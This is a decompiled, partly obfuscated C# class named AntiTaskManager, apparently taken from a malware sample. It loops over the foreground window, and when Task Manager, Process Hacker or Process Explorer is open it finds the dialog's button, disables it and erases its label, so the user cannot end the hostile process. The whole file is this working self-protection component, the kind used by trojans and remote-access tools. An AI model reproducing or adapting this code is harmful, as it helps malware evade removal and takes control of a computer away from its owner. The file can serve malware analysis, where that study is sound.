using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace LLLLLDDBHFBBWHWVHE;

public class AntiTaskManager
{
	private delegate bool Delegate0(int int_0, int int_1);

	[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 734)]
	private struct Struct1
	{
	}

	private static readonly char[] char_0;

	private static readonly char[] char_1;

	private static readonly string[] string_0;

	internal static byte byte_0/* Not supported: data(00) */;

	internal List<IntPtr> list_0;

	public AntiTaskManager()
	{
		List<IntPtr> list = (list_0 = new List<IntPtr>());
	}

	[DllImport("user32.dll")]
	private static extern bool EnableWindow(IntPtr intptr_0, bool bool_0);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowThreadProcessId(IntPtr intptr_0, ref int int_0);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetForegroundWindow();

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetClassNameA(int int_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_1, int int_1);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SendMessageA(int int_0, int int_1, int int_2, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_1);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern int GetWindowText(int int_0, StringBuilder stringBuilder_0, int int_1);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern int GetWindowTextLength(int int_0);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int EnumChildWindows(IntPtr intptr_0, Delegate0 delegate0_0, ref IntPtr intptr_1);

	private bool method_0(int int_0, int int_1)
	{
		list_0.Add((IntPtr)int_0);
		return true;
	}

	public void protect()
	{
		while (true)
		{
			Thread.Sleep(0);
			IntPtr foregroundWindow = GetForegroundWindow();
			if (foregroundWindow.ToInt32() == 0)
			{
				continue;
			}
			int int_ = 0;
			GetWindowThreadProcessId(foregroundWindow, ref int_);
			if (int_ <= 0)
			{
				continue;
			}
			string text = "";
			int windowTextLength = GetWindowTextLength((int)foregroundWindow);
			List<IntPtr> list;
			int num;
			checked
			{
				if (windowTextLength == 0)
				{
					text = "";
				}
				else
				{
					StringBuilder stringBuilder = new StringBuilder(windowTextLength + 1);
					text = ((GetWindowText((int)foregroundWindow, stringBuilder, stringBuilder.Capacity) != 0) ? stringBuilder.ToString() : "");
				}
				Process processById = Process.GetProcessById(int_);
				if (!((Operators.CompareString(processById.ProcessName.ToLower(), "taskmgr", false) == 0) | (Operators.CompareString(processById.ProcessName.ToLower(), "processhacker", false) == 0) | (Operators.CompareString(text.ToLower(), "process explorer", false) == 0)))
				{
					continue;
				}
				list = new List<IntPtr>();
				num = 0;
				IntPtr[] array = method_1(foregroundWindow);
				foreach (IntPtr intPtr in array)
				{
					string string_ = Strings.Space(200);
					int classNameA = GetClassNameA((int)intPtr, ref string_, 200);
					string_ = string_.Remove(classNameA, 200 - classNameA);
					if (Operators.CompareString(string_.ToLower(), "button", false) == 0)
					{
						list.Add(intPtr);
					}
					if ((Operators.CompareString(string_.ToLower(), "static", false) == 0) | (Operators.CompareString(string_.ToLower(), "directuihwnd", false) == 0))
					{
						num++;
					}
				}
			}
			if (list.Count == 2 && (num == 2 || num == 1))
			{
				EnableWindow(list[0], bool_0: false);
				int int_2 = (int)list[0];
				string string_2 = "";
				SendMessageA(int_2, 12, 0, ref string_2);
			}
		}
	}

	private IntPtr[] method_1(IntPtr intptr_0)
	{
		lock (this)
		{
			list_0.Clear();
			Delegate0 delegate0_ = method_0;
			IntPtr intptr_ = (IntPtr)0;
			EnumChildWindows(intptr_0, delegate0_, ref intptr_);
			return list_0.ToArray();
		}
	}

	static AntiTaskManager()
	{
		char_1 = new char[367];
		char[] array = new char[8];
		array[1] = '㦎';
		array[0] = '\u05b1';
		array[2] = 'ซ';
		array[6] = '☂';
		array[4] = 'Ἦ';
		array[3] = '㥧';
		array[7] = '㲂';
		array[5] = '⯮';
		string_0 = new string[26];
		char_0 = array;
	}
}
